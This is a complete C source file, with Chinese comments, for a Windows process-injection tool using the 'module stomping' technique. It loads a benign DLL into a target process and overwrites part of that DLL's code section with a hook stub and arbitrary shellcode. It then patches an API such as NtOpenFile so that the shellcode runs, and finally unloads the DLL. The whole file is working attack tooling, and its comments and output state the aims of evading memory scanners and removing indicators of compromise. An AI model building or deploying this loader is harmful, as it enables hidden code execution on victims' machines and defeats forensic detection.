/*
 * Module Stomping (D1rkInject)
 *
 * 核心原理：
 * 1. 使用 CreateRemoteThread + LoadLibrary 加载良性 DLL 到目标进程
 * 2. 在 DLL 的 .text 节中找到随机位置（RX hole）
 * 3. 覆盖该位置为 HookCode + Shellcode（Module Stomping）
 * 4. Hook 目标 API（如 NtOpenFile），修改前 5 字节为 call 指令
 * 5. API 被调用时 -> HookCode 恢复原始字节 -> 执行 shellcode -> 跳回 API
 * 6. 清除痕迹：恢复内存保护（RWX -> RX）+ 卸载模块（FreeLibrary）
 *
 * 与 Threadless Inject 的区别：
 * - Threadless Inject: 在 ±2GB 范围内分配新内存
 * - Module Stomping: 利用已加载模块的 .text 节（无新内存分配）
 *
 * 优势：
 * - Shellcode 位于合法模块内存中
 * - 无可疑的新内存分配
 * - 最后卸载模块，删除所有 IOC
 *
 * 参考：
 * - https://github.com/d1rkmtrr/D1rkInject
 * - https://github.com/CCob/ThreadlessInject
 */

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>

#pragma comment(lib, "ntdll.lib")

// 最小间隔，确保随机偏移不会太接近
#define MIN_GAP 20000

// 上一次随机偏移
static DWORD g_prevOffset = 0;

// 生成随机偏移
DWORD GetRandomOffset(DWORD maxOffset) {
    DWORD newOffset = rand() % maxOffset;

    while ((newOffset > g_prevOffset ? newOffset - g_prevOffset : g_prevOffset - newOffset) < MIN_GAP) {
        newOffset = rand() % maxOffset;
    }

    g_prevOffset = newOffset;
    return newOffset;
}

// 检查模块是否已加载
BOOL IsModuleLoaded(HANDLE hProcess, const wchar_t* moduleName) {
    HMODULE hMods[1024];
    DWORD cbNeeded;
    wchar_t szModName[MAX_PATH];

    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        return FALSE;
    }

    for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
        if (GetModuleBaseNameW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(wchar_t))) {
            if (_wcsicmp(szModName, moduleName) == 0) {
                return TRUE;
            }
        }
    }

    return FALSE;
}

// 获取远程进程中的模块句柄
HMODULE GetRemoteModuleHandle(HANDLE hProcess, const wchar_t* moduleName) {
    HMODULE hMods[1024];
    DWORD cbNeeded;
    wchar_t szModName[MAX_PATH];

    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        return NULL;
    }

    for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
        if (GetModuleBaseNameW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(wchar_t))) {
            if (_wcsicmp(szModName, moduleName) == 0) {
                return hMods[i];
            }
        }
    }

    return NULL;
}

// 在目标进程中加载模块并找到 .text 节中的 RX hole
LPVOID GetRXHole(HANDLE hProcess, const wchar_t* moduleName, SIZE_T shellcodeLen) {
    // 检查模块是否已加载
    if (IsModuleLoaded(hProcess, moduleName)) {
        printf("[-] %ws is already loaded in the target process\n", moduleName);
        return NULL;
    }

    printf("[+] Loading module %ws into target process...\n", moduleName);

    // 分配内存写入模块路径
    SIZE_T moduleNameSize = (wcslen(moduleName) + 1) * sizeof(wchar_t);
    PVOID moduleNameAddr = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!moduleNameAddr) {
        printf("[-] Failed to allocate memory for module name (%u)\n", GetLastError());
        return NULL;
    }

    printf("[+] Allocated memory for module name at %p\n", moduleNameAddr);

    // 写入模块路径
    if (!WriteProcessMemory(hProcess, moduleNameAddr, (LPVOID)moduleName, moduleNameSize, NULL)) {
        printf("[-] Failed to write module name (%u)\n", GetLastError());
        VirtualFreeEx(hProcess, moduleNameAddr, 0, MEM_RELEASE);
        return NULL;
    }

    // 获取 LoadLibraryW 地址
    PTHREAD_START_ROUTINE pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");
    if (!pLoadLibrary) {
        printf("[-] Failed to get LoadLibraryW address (%u)\n", GetLastError());
        VirtualFreeEx(hProcess, moduleNameAddr, 0, MEM_RELEASE);
        return NULL;
    }

    // 创建远程线程加载模块
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, moduleNameAddr, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread (%u)\n", GetLastError());
        VirtualFreeEx(hProcess, moduleNameAddr, 0, MEM_RELEASE);
        return NULL;
    }

    // 等待加载完成
    WaitForSingleObject(hThread, INFINITE);

    // 检查线程退出码
    DWORD exitCode;
    if (!GetExitCodeThread(hThread, &exitCode)) {
        printf("[-] Failed to get exit code (%u)\n", GetLastError());
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, moduleNameAddr, 0, MEM_RELEASE);
        return NULL;
    }

    CloseHandle(hThread);

    if (!exitCode) {
        printf("[-] LoadLibraryW failed in target process\n");
        VirtualFreeEx(hProcess, moduleNameAddr, 0, MEM_RELEASE);
        return NULL;
    }

    printf("[+] Module loaded successfully\n");

    // 在本地加载同样的模块以解析 PE 头
    PVOID moduleBase = LoadLibraryW(moduleName);
    if (!moduleBase) {
        printf("[-] Failed to load module locally (%u)\n", GetLastError());
        return NULL;
    }

    printf("[+] Local module base: %p\n", moduleBase);

    // 解析 PE 头
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((DWORD64)moduleBase + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    // 找到 .text 节
    LPVOID textSectionBase = (LPVOID)((DWORD64)moduleBase + (DWORD64)sectionHeader->PointerToRawData);
    DWORD textSectionSize = sectionHeader->SizeOfRawData;

    printf("[+] .text section: base=%p, size=%u bytes\n", textSectionBase, textSectionSize);

    // 检查 .text 节是否足够大
    if (textSectionSize < shellcodeLen) {
        printf("[-] .text section too small (%u bytes < %zu bytes)\n", textSectionSize, shellcodeLen);
        printf("[-] Choose another module with a larger .text section\n");
        return NULL;
    }

    // 生成随机偏移
    srand((unsigned)time(NULL));
    DWORD randomOffset = GetRandomOffset(textSectionSize - (DWORD)shellcodeLen);

    printf("[+] Random offset: 0x%X (%u bytes)\n", randomOffset, randomOffset);

    // 计算 RX hole 地址
    LPVOID rxHole = (LPVOID)((DWORD64)textSectionBase + randomOffset);

    printf("[+] RX hole found at %p\n", rxHole);

    return rxHole;
}

// 注入 HookCode + Shellcode 并 Hook API
BOOL InjectAndHook(HANDLE hProcess, LPVOID rxHole, LPVOID shellcode, SIZE_T shellcodeLen,
                   const wchar_t* hookModuleName, const wchar_t* hookApiName) {

    // HookCode（与 Threadless Inject 的 LoaderStub 相同）
    unsigned char hookCode[] = {
        0x58,                                           // pop    rax
        0x48, 0x83, 0xE8, 0x05,                         // sub    rax,0x5
        0x50,                                           // push   rax
        0x51,                                           // push   rcx
        0x52,                                           // push   rdx
        0x41, 0x50,                                     // push   r8
        0x41, 0x51,                                     // push   r9
        0x41, 0x52,                                     // push   r10
        0x41, 0x53,                                     // push   r11
        0x48, 0xB9, 0x88, 0x77, 0x66, 0x55,             // movabs rcx,0x1122334455667788
                    0x44, 0x33, 0x22, 0x11,
        0x48, 0x89, 0x08,                               // mov    QWORD PTR [rax],rcx
        0x48, 0x83, 0xEC, 0x40,                         // sub    rsp,0x40
        0xE8, 0x11, 0x00, 0x00, 0x00,                   // call   shellcode (placeholder)
        0x48, 0x83, 0xC4, 0x40,                         // add    rsp,0x40
        0x41, 0x5B,                                     // pop    r11
        0x41, 0x5A,                                     // pop    r10
        0x41, 0x59,                                     // pop    r9
        0x41, 0x58,                                     // pop    r8
        0x5A,                                           // pop    rdx
        0x59,                                           // pop    rcx
        0x58,                                           // pop    rax
        0xFF, 0xE0,                                     // jmp    rax
        0x90                                            // nop
    };

    // 转换 API 名称为 char*
    size_t len = wcslen(hookApiName) + 1;
    char* apiName = (char*)malloc(len);
    size_t convertedChars = 0;
    wcstombs_s(&convertedChars, apiName, len, hookApiName, _TRUNCATE);

    // 获取 API 地址
    FARPROC apiAddr = GetProcAddress(GetModuleHandleW(hookModuleName), apiName);
    if (!apiAddr) {
        printf("[-] Failed to get address of %s (%u)\n", apiName, GetLastError());
        free(apiName);
        return FALSE;
    }

    printf("[+] %s address: %p\n", apiName, apiAddr);

    // 读取 API 的原始 8 字节
    unsigned char originalBytes[8];
    if (!ReadProcessMemory(hProcess, apiAddr, &originalBytes, sizeof(originalBytes), NULL)) {
        printf("[-] Failed to read original bytes (%u)\n", GetLastError());
        free(apiName);
        return FALSE;
    }

    printf("[+] Original bytes: ");
    for (int i = 0; i < 8; i++) {
        printf("%02X ", originalBytes[i]);
    }
    printf("\n");

    // 将原始字节嵌入 HookCode（偏移 18）
    memcpy(hookCode + 18, originalBytes, sizeof(originalBytes));

    // 计算 call shellcode 的相对偏移（偏移 39）
    DWORD offset = (DWORD)((char*)rxHole - (char*)(hookCode + sizeof(hookCode)));
    memcpy(hookCode + 39, &offset, sizeof(offset));

    printf("[+] Writing HookCode + Shellcode to RX hole...\n");

    // 修改内存保护为 RWX
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, rxHole, sizeof(hookCode) + shellcodeLen,
                          PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtectEx failed (%u)\n", GetLastError());
        free(apiName);
        return FALSE;
    }

    // 写入 HookCode
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, rxHole, hookCode, sizeof(hookCode), &bytesWritten)) {
        printf("[-] Failed to write HookCode (%u)\n", GetLastError());
        free(apiName);
        return FALSE;
    }

    // 写入 Shellcode
    if (!WriteProcessMemory(hProcess, (LPBYTE)rxHole + sizeof(hookCode),
                           shellcode, shellcodeLen, &bytesWritten)) {
        printf("[-] Failed to write Shellcode (%u)\n", GetLastError());
        free(apiName);
        return FALSE;
    }

    printf("[+] HookCode + Shellcode written successfully\n");

    // 恢复原始内存保护
    if (!VirtualProtectEx(hProcess, rxHole, sizeof(hookCode) + shellcodeLen,
                          oldProtect, &oldProtect)) {
        printf("[-] Failed to restore memory protection (%u)\n", GetLastError());
        free(apiName);
        return FALSE;
    }

    printf("[+] Hooking API %s...\n", apiName);

    // 构建 call 指令（E8 XX XX XX XX）
    unsigned char callInstruction[5] = { 0xE8, 0x00, 0x00, 0x00, 0x00 };
    offset = (DWORD)((char*)rxHole - ((char*)apiAddr + sizeof(callInstruction)));
    memcpy(callInstruction + 1, &offset, sizeof(offset));

    // 修改 API 前 5 字节为 call 指令
    oldProtect = 0;
    if (!VirtualProtectEx(hProcess, apiAddr, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] Failed to change API protection (%u)\n", GetLastError());
        free(apiName);
        return FALSE;
    }

    bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, apiAddr, callInstruction, sizeof(callInstruction), &bytesWritten)) {
        printf("[-] Failed to write call instruction (%u)\n", GetLastError());
        free(apiName);
        return FALSE;
    }

    if (bytesWritten != sizeof(callInstruction)) {
        printf("[-] Failed to write full call instruction\n");
        free(apiName);
        return FALSE;
    }

    printf("[+] API hooked successfully\n");

    free(apiName);
    return TRUE;
}

// 卸载模块
BOOL UnloadModule(HANDLE hProcess, const wchar_t* moduleName) {
    printf("[+] Unloading module %ws...\n", moduleName);

    // 获取模块句柄
    HMODULE hMod = GetRemoteModuleHandle(hProcess, moduleName);
    if (!hMod) {
        printf("[-] Module %ws not found\n", moduleName);
        return FALSE;
    }

    printf("[+] Module handle: %p\n", hMod);

    // 获取 FreeLibrary 地址
    LPVOID freeLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeLibrary");
    if (!freeLibraryAddr) {
        printf("[-] Failed to get FreeLibrary address (%u)\n", GetLastError());
        return FALSE;
    }

    // 创建远程线程卸载模块
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)freeLibraryAddr,
                                       hMod, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread (%u)\n", GetLastError());
        return FALSE;
    }

    // 等待卸载完成
    WaitForSingleObject(hThread, INFINITE);

    // 检查退出码
    DWORD exitCode;
    if (!GetExitCodeThread(hThread, &exitCode)) {
        printf("[-] Failed to get exit code (%u)\n", GetLastError());
        CloseHandle(hThread);
        return FALSE;
    }

    CloseHandle(hThread);

    // 验证模块是否已卸载
    if (!IsModuleLoaded(hProcess, moduleName)) {
        printf("[+] Module unloaded successfully\n");
        return TRUE;
    }

    printf("[-] Module still loaded after FreeLibrary\n");
    return FALSE;
}

int wmain(int argc, wchar_t** argv) {
    if (argc != 6) {
        printf("\nUsage:\n");
        printf("  %ws <PID> <shellcode.bin> <LoadedModule> <HookedModule> <HookedAPI>\n\n", argv[0]);
        printf("Example:\n");
        printf("  %ws 1234 payload.bin amsi.dll ntdll.dll NtOpenFile\n\n", argv[0]);
        printf("Description:\n");
        printf("  - PID: Target process ID\n");
        printf("  - shellcode.bin: Path to shellcode file\n");
        printf("  - LoadedModule: DLL to load and stomp (e.g., amsi.dll)\n");
        printf("  - HookedModule: Module containing the API to hook (e.g., ntdll.dll)\n");
        printf("  - HookedAPI: API function to hook (e.g., NtOpenFile)\n\n");
        return -1;
    }

    DWORD pid = _wtoi(argv[1]);
    wchar_t* shellcodePath = argv[2];
    wchar_t* loadedModule = argv[3];
    wchar_t* hookedModule = argv[4];
    wchar_t* hookedApi = argv[5];

    printf("[+] Module Stomping Injection\n");
    printf("[+] Target PID: %u\n", pid);
    printf("[+] Shellcode: %ws\n", shellcodePath);
    printf("[+] Module to load: %ws\n", loadedModule);
    printf("[+] Hook target: %ws!%ws\n\n", hookedModule, hookedApi);

    // 读取 shellcode
    HANDLE hFile = CreateFileW(shellcodePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open shellcode file (%u)\n", GetLastError());
        return -1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID shellcode = malloc(fileSize);
    DWORD bytesRead;

    if (!ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL)) {
        printf("[-] Failed to read shellcode (%u)\n", GetLastError());
        CloseHandle(hFile);
        free(shellcode);
        return -1;
    }

    CloseHandle(hFile);

    printf("[+] Shellcode loaded: %u bytes\n\n", fileSize);

    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process %u (%u)\n", pid, GetLastError());
        free(shellcode);
        return -1;
    }

    // 获取 RX hole
    LPVOID rxHole = GetRXHole(hProcess, loadedModule, fileSize);
    if (!rxHole) {
        printf("[-] Failed to find RX hole\n");
        CloseHandle(hProcess);
        free(shellcode);
        return -1;
    }

    printf("\n[+] RX hole found at %p in %ws\n\n", rxHole, loadedModule);

    // 注入并 Hook
    if (!InjectAndHook(hProcess, rxHole, shellcode, fileSize, hookedModule, hookedApi)) {
        printf("[-] Failed to inject or hook\n");
        CloseHandle(hProcess);
        free(shellcode);
        return -1;
    }

    printf("\n[+] Injection complete!\n");
    printf("[+] Waiting for callback...\n");
    printf("[+] Trigger the hooked API (%ws) in the target process\n\n", hookedApi);

    // 删除旧的标记文件（如果存在）
    DeleteFileA("C:\\Users\\Public\\hook_triggered.marker");

    // 轮询标记文件，等待Hook被触发
    printf("[*] Polling for hook trigger marker...\n");
    BOOL hookTriggered = FALSE;
    int pollCount = 0;
    while (!hookTriggered && pollCount < 60) {  // 最多等待60秒
        HANDLE hMarker = CreateFileA(
            "C:\\Users\\Public\\hook_triggered.marker",
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hMarker != INVALID_HANDLE_VALUE) {
            CloseHandle(hMarker);
            printf("\n[+] Hook triggered! Marker file detected.\n");
            hookTriggered = TRUE;
        } else {
            if (pollCount % 5 == 0) {
                printf(".");
                fflush(stdout);
            }
            Sleep(1000);  // 每秒检查一次
            pollCount++;
        }
    }

    if (!hookTriggered) {
        printf("\n[-] Timeout: Hook was not triggered within 60 seconds\n");
    }

    // 清理标记文件
    DeleteFileA("C:\\Users\\Public\\hook_triggered.marker");

    // 恢复内存保护（RWX -> RX）
    printf("\n[+] Restoring memory protection...\n");

    size_t len = wcslen(hookedApi) + 1;
    char* apiName = (char*)malloc(len);
    size_t convertedChars = 0;
    wcstombs_s(&convertedChars, apiName, len, hookedApi, _TRUNCATE);

    FARPROC apiAddr = GetProcAddress(GetModuleHandleW(hookedModule), apiName);
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, apiAddr, 8, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Failed to restore API protection (%u)\n", GetLastError());
    } else {
        printf("[+] API protection restored (RWX -> RX)\n");
    }

    free(apiName);

    // 自动继续卸载模块
    printf("\n[*] Proceeding to unload %ws and remove IOCs...\n", loadedModule);

    // 卸载模块
    if (!UnloadModule(hProcess, loadedModule)) {
        printf("[-] Failed to unload module\n");
    }

    printf("\n[+] All IOCs removed!\n");
    printf("[+] Module Stomping complete.\n");

    CloseHandle(hProcess);
    free(shellcode);

    return 0;
}
